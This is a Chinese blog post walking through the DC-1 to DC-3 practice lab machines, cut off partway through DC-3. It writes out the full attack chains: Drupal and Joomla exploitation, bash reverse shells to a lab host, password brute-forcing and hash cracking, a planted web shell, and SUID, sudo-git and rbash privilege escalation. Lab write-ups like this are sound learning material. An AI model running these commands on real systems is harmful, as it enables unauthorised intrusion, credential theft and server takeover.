<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="生活,旅行,思考,代码,博客" />
   
  <meta name="description" content="一生努力" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
     0Rld
  </title>
  <meta name="generator" content="hexo-theme-yilia-plus">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/css/style.css">

  
<script src="/js/pace.min.js"></script>


  

  

<link rel="alternate" href="/atom.xml" title="0Rld" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

</html>
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
<body>
  <div id="app">
    <main class="content">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover3.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">0Rld</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
        <img
          src="/images/ayer.svg"
          class="cover-logo"
          alt="0Rld"
        />
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>

<div id="main">
  <section class="outer">
  <article class="articles">
    
    
    
    
    <article id="post-DC靶场系列" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/"
    >DC靶场系列</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" class="article-date">
  <time datetime="2020-09-12T13:26:08.000Z" itemprop="datePublished">2020-09-12</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="DC-1渗透过程"><a href="#DC-1渗透过程" class="headerlink" title="DC-1渗透过程"></a><strong>DC-1渗透过程</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#发现主机ip</span></span><br><span class="line">nmap -sV -A <span class="number">192.168</span><span class="number">.126</span><span class="number">.141</span> <span class="comment">#详细端口服务扫描</span></span><br><span class="line"><span class="comment">###发现了80端口是drupal7 服务，开启msf查找漏洞</span></span><br><span class="line">msf5 &gt; search drupal</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/gather/drupal_openid_xxe             <span class="number">2012</span><span class="number">-10</span><span class="number">-17</span>       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   <span class="number">4</span>  exploit/unix/webapp/drupal_drupalgeddon2       <span class="number">2018</span><span class="number">-03</span><span class="number">-28</span>       excellent  Yes    Drupal Drupalgeddon <span class="number">2</span> Forms API Property Injection</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts <span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span></span><br><span class="line">rhosts =&gt; 192.168.126.153</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">4444</span> </span><br><span class="line">meterpreter &gt; </span><br><span class="line"><span class="comment">#成功进入目标服务器，为稳定连接，可以反弹shell到本地</span></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span>  <span class="comment">#获取交互shell</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ bash -i &amp;&gt; /dev/tcp/<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="comment">#反弹bash</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333 #本地监听</span></span><br><span class="line">listening on [any] <span class="number">2333</span> ...</span><br><span class="line"><span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>] <span class="number">51022</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span> <span class="comment">#这里再反弹一个更稳定</span></span><br></pre></td></tr></table></figure>

<p><strong>本地发现flag1、提示查看数据库配置文件，发现flag2，给了数据库的账号密码，连接数据库看看</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> mysql <span class="literal">-u</span> dbuser <span class="literal">-p</span>  <span class="comment">#连接数据库</span></span><br><span class="line">Enter password: R0ck3t</span><br><span class="line">mysql&gt; show databases;  </span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; select * from users \G;</span><br><span class="line">select * from users \G;</span><br><span class="line">*************************** <span class="number">2</span>. row ***************************</span><br><span class="line">             uid: <span class="number">1</span></span><br><span class="line">            name: admin</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: <span class="number">1550581826</span></span><br><span class="line">          access: <span class="number">1550583852</span></span><br><span class="line">           login: <span class="number">1550582362</span></span><br><span class="line">          status: <span class="number">1</span></span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: <span class="number">0</span></span><br><span class="line">            init: admin@example.com</span><br><span class="line">            <span class="keyword">data</span>: b:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">###修改数据库admin的密码，这里用自带的hash加密求hash值</span></span><br><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> php scripts/password<span class="literal">-hash</span>.sh <span class="number">123456</span></span><br><span class="line">password: <span class="number">123456</span>                hash: <span class="variable">$S</span><span class="variable">$DvvyyPuAd4L6M</span>/fZV0kmnokciLomH5YSvUZ.w.aaALZpqe1zMTtV</span><br><span class="line"><span class="comment">#更新数据库密码</span></span><br><span class="line">update users set pass=<span class="string">'$S$DRP9A87VYWMUnTb4Dl7yivYAlibCNONO32cCB3Qc1LT5Alr90rAu'</span> where uid=<span class="number">1</span>;</span><br><span class="line"><span class="comment">#登陆网页发现flag3，提示查看/etc/passwd</span></span><br><span class="line"><span class="comment">#提权，寻找有suid权限的文件</span></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / <span class="literal">-perm</span> /<span class="number">4000</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">touch test <span class="comment"># 创建一个空文件</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'whoami'</span> \; <span class="comment">#查看是否提权</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'/bin/sh'</span> \;<span class="comment">#将root的bash反弹</span></span><br><span class="line"><span class="comment">#cd /root 找到最终的flag文件</span></span><br><span class="line">cat final<span class="literal">-flag</span>.txt</span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">'_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it'</span>s all greatly</span><br><span class="line">appreciated.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-2渗透过程"><a href="#DC-2渗透过程" class="headerlink" title="DC-2渗透过程"></a><strong>DC-2渗透过程</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -A -p- dc-2 #全端口扫描更具体</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">10</span> ((Debian))</span><br><span class="line">|_http<span class="literal">-generator</span>: WordPress <span class="number">4.7</span>.<span class="number">10</span></span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Apache/<span class="number">2.4</span>.<span class="number">10</span> (Debian)</span><br><span class="line">|_http<span class="literal">-title</span>: DC<span class="literal">-2</span> &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">|_https<span class="literal">-redirect</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line"><span class="number">7744</span>/tcp open  ssh     OpenSSH <span class="number">6.7</span>p1 Debian <span class="number">5</span>+deb8u7 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">1024</span> <span class="number">52</span>:<span class="number">51</span>:<span class="number">7</span>b:<span class="number">6</span>e:<span class="number">70</span>:a4:<span class="number">33</span>:<span class="number">7</span>a:d2:<span class="number">4</span>b:e1:<span class="number">0</span>b:<span class="number">5</span>a:<span class="number">0</span>f:<span class="number">9</span>e:d7 (DSA)</span><br><span class="line">|   <span class="number">2048</span> <span class="number">59</span>:<span class="number">11</span>:d8:af:<span class="number">38</span>:<span class="number">51</span>:<span class="number">8</span>f:<span class="number">41</span>:a7:<span class="number">44</span>:b3:<span class="number">28</span>:<span class="number">03</span>:<span class="number">80</span>:<span class="number">99</span>:<span class="number">42</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> df:<span class="number">18</span>:<span class="number">1</span>d:<span class="number">74</span>:<span class="number">26</span>:ce:c1:<span class="number">4</span>f:<span class="number">6</span>f:<span class="number">2</span>f:c1:<span class="number">26</span>:<span class="number">54</span>:<span class="number">31</span>:<span class="number">51</span>:<span class="number">91</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> d9:<span class="number">38</span>:<span class="number">5</span>f:<span class="number">99</span>:<span class="number">7</span>c:<span class="number">0</span>d:<span class="number">64</span>:<span class="number">7</span>e:<span class="number">1</span>d:<span class="number">46</span>:f6:e9:<span class="number">7</span>c:c6:<span class="number">37</span>:<span class="number">17</span> (ED25519)</span><br><span class="line"></span><br><span class="line"><span class="comment">#访问80端口，发现重定向到http://dc-2</span></span><br><span class="line">root@kali:~<span class="comment"># vi /etc/hosts #写入ip dc-2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#访问发现是wordpress，用wpscan扫描</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -e u</span></span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="type">i</span>] <span class="title">User</span></span>(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2</span></span><br><span class="line">CeWL <span class="number">5.4</span>.<span class="number">7</span> (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -U users.txt -P passwd.txt </span></span><br><span class="line"></span><br><span class="line">[<span class="type">i</span>] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># ssh tom@192.168.126.153 -p 7744</span></span><br></pre></td></tr></table></figure>



<p>连接到tom主机上后发现大部分命令无法使用，查看环境变量发现没用/bin/bash，需要添加环境变量才可以正常执行bash，查看可执行的命令（这里有个查询的小技巧，免去一个个尝试），发现可正常执行vi，在vi中可执行命令，可利用此添加环境变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">tom@DC<span class="number">-2</span>:~$ export  <span class="comment">#查看环境变量</span></span><br><span class="line">declare -x HOME=<span class="string">"/home/tom"</span></span><br><span class="line">declare -x LANG=<span class="string">"en_US.UTF-8"</span></span><br><span class="line">declare -x LOGNAME=<span class="string">"tom"</span></span><br><span class="line">declare -x MAIL=<span class="string">"/var/mail/tom"</span></span><br><span class="line">declare -x OLDPWD</span><br><span class="line">declare -rx PATH=<span class="string">"/home/tom/usr/bin"</span></span><br><span class="line">declare -x PWD=<span class="string">"/home/tom"</span></span><br><span class="line">declare -rx SHELL=<span class="string">"/bin/rbash"</span></span><br><span class="line">declare -x SHLVL=<span class="string">"1"</span></span><br><span class="line">declare -x SSH_CLIENT=<span class="string">"192.168.126.33 35824 7744"</span></span><br><span class="line">declare -x SSH_CONNECTION=<span class="string">"192.168.126.33 35824 192.168.126.154 7744"</span></span><br><span class="line">declare -x SSH_TTY=<span class="string">"/dev/pts/1"</span></span><br><span class="line">declare -x TERM=<span class="string">"xterm-256color"</span></span><br><span class="line">declare -x USER=<span class="string">"tom"</span></span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo $PATH</span><br><span class="line">/home/tom/usr/bin</span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo /home/tom/usr/bin/*  <span class="comment">#查询可执行命令</span></span><br><span class="line">/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/vi</span><br><span class="line"></span><br><span class="line">vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">$ export PATH=$PATH:/bin/ <span class="comment"># 导入环境变量</span></span><br><span class="line">$ export PATH=$PATH:/usr/bin</span><br><span class="line"></span><br><span class="line">jerry@DC<span class="number">-2</span>:/home/tom$ sudo -l  <span class="comment">#查看可执行root权限的命令</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC<span class="number">-2</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC<span class="number">-2</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里提示可利用git提权</span></span><br><span class="line">root@DC<span class="number">-2</span>:/home/jerry<span class="comment"># cat flag4.txt </span></span><br><span class="line">Good to see that yo<span class="string">u've made it this far - but you'</span>re <span class="keyword">not</span> home yet. </span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line">No hints here - yo<span class="string">u're on your own now.  :-)</span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jerry@DC-2:/home/tom$ sudo git help config</span></span><br><span class="line"><span class="string">！/bin/sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@DC-2:~# cat final-flag.txt </span></span><br><span class="line"><span class="string"> __    __     _ _       _                    _ </span></span><br><span class="line"><span class="string">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ | |  / _` |/ _ \| '</span>_ \ / _ \/  /</span><br><span class="line"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span><br><span class="line">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-3渗透过程"><a href="#DC-3渗透过程" class="headerlink" title="DC-3渗透过程"></a><strong>DC-3渗透过程</strong></h2><p><strong>就开放了80端口，可用wappalyzer插件查看cms指纹等信息，发现是joomla框架</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/1.png" alt></p>
<p><strong>利用joomscan扫描出后台登陆地址、版本信息以及相关目录，然后查询相关漏洞信息进行利用！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># perl joomscan.pl -u http://192.168.126.150</span></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla <span class="number">3.7</span>.<span class="number">0</span></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/components</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/modules</span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/</span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># searchsploit joomla 3.7.0</span></span><br><span class="line">Joomla! <span class="number">3.7</span>.<span class="number">0</span> - <span class="string">'com_fields'</span> SQL Injection                                                           | exploits/php/webapps/<span class="number">42033</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看漏洞利用方式，存在SQL注入漏洞，相关sqlmap使用方式也列出来了</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span></span><br><span class="line"><span class="comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="comment"># Date: 05-19-2017</span></span><br><span class="line"><span class="comment"># CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[<span class="type">fullordering</span>]=updatexml%<span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Using</span> Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap <span class="literal">-u</span> <span class="string">"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> -<span class="literal">-risk</span>=<span class="number">3</span> -<span class="literal">-level</span>=<span class="number">5</span> -<span class="literal">-random</span><span class="literal">-agent</span> -<span class="literal">-dbs</span> <span class="literal">-p</span> list[<span class="type">fullordering</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sqlmap爆破出管理员账号和密码</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -t</span></span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -T "#__users" -C username,password --dump</span></span><br><span class="line"></span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | <span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><strong>得到的密码是hash值，可以利用hashcat进行爆破，密码本用kail自带的rockyou.txt</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hashid hash.txt </span></span><br><span class="line">-<span class="operator">-File</span> <span class="string">'hash.txt'</span>--</span><br><span class="line">Analyzing <span class="string">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span></span><br><span class="line"><span class="function">[+] <span class="title">Blowfish</span></span>(OpenBSD) </span><br><span class="line">[+] Woltlab Burning Board <span class="number">4</span>.x </span><br><span class="line">[+] bcrypt </span><br><span class="line">root@kali:~<span class="comment"># hashcat -m 3200 -a 0 -d 1 --force hash.txt rockyou.txt</span></span><br><span class="line">hashcat (v5.<span class="number">1.0</span>) starting...</span><br><span class="line"><span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy</span></span><br></pre></td></tr></table></figure>

<p><strong>得到密码为snoopy，登陆后台在template处添加shell.php写入一句话木马，用蚁剑连接，注意木马的路径，此处有提示</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/2.png" alt></p>
<p><strong>进入服务器后，发现无法提权，看看该版本系统是否存有漏洞，这里选择了Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps  | exploits/linux/dos/39773.txt  进行内核提权</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">'sh -i &amp;&gt;/dev/tcp/192.168.126.33/4444 0&gt;&amp;1'</span>  <span class="comment">#反弹shell</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 16.04</span></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apport <span class="number">2.</span>x (Ubuntu Desktop <span class="number">12.10</span> &lt; <span class="number">16.04</span>) - Local Code Execution                           | exploits/linux/local/<span class="number">40937.</span>txt</span><br><span class="line">Exim <span class="number">4</span> (Debian <span class="number">8</span> / Ubuntu <span class="number">16.04</span>) - Spool Privilege Escalation                              | exploits/linux/local/<span class="number">40054.</span>c</span><br><span class="line">Google Chrome (Fedora <span class="number">25</span> / Ubuntu <span class="number">16.04</span>) - <span class="string">'tracker-extract'</span> / <span class="string">'gnome-video-thumbnailer'</span> + | exploits/linux/local/<span class="number">40943.</span>txt</span><br><span class="line">LightDM (Ubuntu <span class="number">16.04</span>/<span class="number">16.10</span>) - <span class="string">'Guest Account'</span> Local Privilege Escalation                  | exploits/linux/local/<span class="number">41923.</span>txt</span><br><span class="line">Linux Kernel (Debian <span class="number">7.7</span>/<span class="number">8.5</span>/<span class="number">9.0</span> / Ubuntu <span class="number">14.04</span><span class="number">.2</span>/<span class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">22</span>/<span class="number">25</span> / CentOS <span class="number">7.</span> | exploits/linux_x86<span class="number">-64</span>/local/<span class="number">42275.</span>c</span><br><span class="line">Linux Kernel (Debian <span class="number">9</span>/<span class="number">10</span> / Ubuntu <span class="number">14.04</span><span class="number">.5</span>/<span 